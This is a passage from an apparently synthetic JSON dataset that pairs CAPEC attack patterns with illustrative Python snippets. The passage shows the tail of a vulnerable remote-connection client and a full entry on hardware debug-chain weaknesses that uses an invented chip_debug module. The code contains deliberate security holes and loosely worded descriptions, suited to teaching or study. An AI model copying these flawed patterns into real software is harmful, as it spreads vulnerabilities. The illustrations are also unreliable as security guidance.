args=(client_socket,)).start()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a vulnerable web client that establishes a remote desktop connection to an adversary's system, bypassing authentication and ignoring data authenticity. The code includes web functionality from an untrusted source, lacks authentication mechanisms, and has context switching race conditions, making it vulnerable to various attacks."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "import chip_debug\n\ndef debug_access(debug_chain):\n    if debug_chain == 'chain1':\n        return chip_debug.chain1_access()\n    elif debug_chain == 'chain2':\n        return chip_debug.chain2_access()\n    else:\n        return chip_debug.default_access()\n\n# Incorrect chaining or granularity of debug components\n# CWE-1296\ndebug_chain = 'chain1'\naccess_granted = debug_access(debug_chain)\n\n# Unauthorized error injection can degrade hardware redundancy\n# CWE-1334\nif access_granted:\n    chip_debug.inject_error('redundant_block')\n\n# On-chip debug and test interface with improper access control\n# CWE-1191\nchip_debug.access_internal_registers('user_input')\n\n# Improper handling of faults that lead to instruction skips\n# CWE-1332\ntry:\n    chip_debug.execute_security_critical_instructions()\nexcept Exception as e:\n    print('Instruction skipped:', e)\n\n# Improper management of sensitive trace data\n# CWE-1323\ntrace_data = chip_debug.collect_trace_data()\nchip_debug.store_trace_data(trace_data, 'unprotected_location')",
        "description": "This code snippet demonstrates the CAPEC of exploiting incorrect chaining or granularity of hardware debug components to gain unauthorized access to debug functionality on a chip. It includes examples of related CWEs, such as incorrect chaining or granularity of debug components, unauthorized error injection, on-chip debug and test interface with improper access control, improper handling of faults that lead to instruction skips, and improper management of sensitive trace data."
    }
]